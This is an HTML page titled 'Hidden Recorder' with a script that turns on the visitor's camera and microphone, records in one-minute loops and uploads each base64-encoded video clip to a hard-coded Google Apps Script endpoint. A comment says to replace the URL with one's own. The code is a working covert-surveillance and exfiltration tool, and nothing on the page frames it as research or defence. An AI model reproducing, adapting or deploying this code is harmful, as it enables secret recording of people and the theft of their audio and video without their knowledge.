<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hidden Recorder (1-Minute)</title>
</head>
<body>
    <button onclick="startRecording()">Start Hidden Recording</button>

    <script>
        let mediaRecorder;
        let chunks = [];
        const UPLOAD_URL = "https://script.google.com/macros/s/AKfycbwzYJ-jm6rBykmwcTVkor3rlCMGCP-M_Pvv6-lhea3sDsIPoT7JeKlj0iYa8cIz7j-F/exec"; // Replace with your Web App URL

        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        chunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: "video/webm" });
                    await uploadToGoogleDrive(blob);
                    chunks = [];
                };

                mediaRecorder.start();
                setInterval(() => {
                    mediaRecorder.stop();
                    mediaRecorder.start();
                }, 60000); // 1 Minute

                alert("Recording started (hidden)");
            } catch (error) {
                console.error("Error:", error);
            }
        }

        async function uploadToGoogleDrive(blob) {
            const reader = new FileReader();
            reader.readAsDataURL(blob);
            reader.onloadend = async function () {
                const base64Data = reader.result.split(',')[1];

                const response = await fetch(UPLOAD_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: new URLSearchParams({
                        file: base64Data,
                        mimetype: "video/webm",
                        filename: `recorded_${Date.now()}.webm`
                    })
                });

                const result = await response.json();
                console.log("Uploaded:", result.fileUrl);
            };
        }
    </script>
</body>
</html>
